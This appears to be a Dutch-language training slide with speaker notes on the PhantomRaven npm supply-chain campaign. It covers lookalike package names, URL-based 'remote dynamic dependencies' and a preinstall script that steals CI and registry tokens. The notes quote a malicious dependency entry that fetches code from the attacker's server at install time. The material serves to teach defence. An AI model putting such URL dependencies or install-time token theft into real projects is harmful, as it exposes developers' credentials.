Incident · augustus–oktober 2025 · onzichtbare dependency

PhantomRaven: “0 dependencies”

Toegang

Geen account gekaapt: de aanvaller publiceerde 126 eigen packages vanaf wegwerpaccounts, met namen die lijken op eslint- en babel-plugins of op namen die een AI zou voorstellen.

Verspreiding

In package.json staat een dependency met een URL in plaats van een versie. npm haalt die bij de installatie van de server van de aanvaller; npmjs.com en scanners tonen “0 dependencies”.

Payload

Het opgehaalde package heeft een preinstall-script dat tokens van npm, GitHub, GitLab, Jenkins en CircleCI steelt, en e-mailadressen uit .gitconfig en .npmrc.

Detectie en respons

Koi Security zag dat packages tijdens de installatie netwerkverkeer maakten, allemaal naar hetzelfde domein. Samen meer dan 86.000 downloads.

Les. “0 dependencies” op npmjs.com betekent niet dat er niets wordt opgehaald: kijk naar wat een package doet.

Had dit tegengehouden

install scripts blokkeren, een gedragsscanner

Deel 4 — Tijdlijn en casestudies · 0:18–0:30

Verdieping: sla over bij tijdgebrek. Van augustus tot oktober 2025 publiceerde een aanvaller 126 packages vanaf een reeks wegwerpaccounts. De namen leken op korte namen van eslint- en babel-plugins (unused-imports, eslint-comments) of op interne namen van bedrijven. Koi Security, dat de campagne ontdekte, noemt het slopsquatting: namen die AI-assistenten verzinnen. Dat is deels zo; de echte vernieuwing zit in de techniek. Remote dynamic dependencies: npm aanvaardt een URL als dependency, bijvoorbeeld "ui-styles-pkg": "http://packages.storeartifact.com/npm/unused-imports". Het package op npmjs.com bevat alleen een “Hello, world!”-script en heeft volgens de website 0 dependencies. Pas bij npm install haalt npm de tweede tarball rechtstreeks van de server van de aanvaller, buiten de registry om. Die server kan per verzoek kiezen wat hij levert: schone code voor een onderzoeker, malware voor een bedrijf. Koi: “To every automated security system, these packages show ‘0 Dependencies.’” Het opgehaalde package heeft een preinstall-script dat e-mailadressen en CI-tokens steelt en ze via drie kanalen naar de aanvaller stuurt. Detectie: Koi zag in een sandbox dat packages tijdens de installatie netwerkverbindingen maakten. Zo werkt een gedragsscanner (laag 5). Install scripts blokkeren had de payload ook tegengehouden.
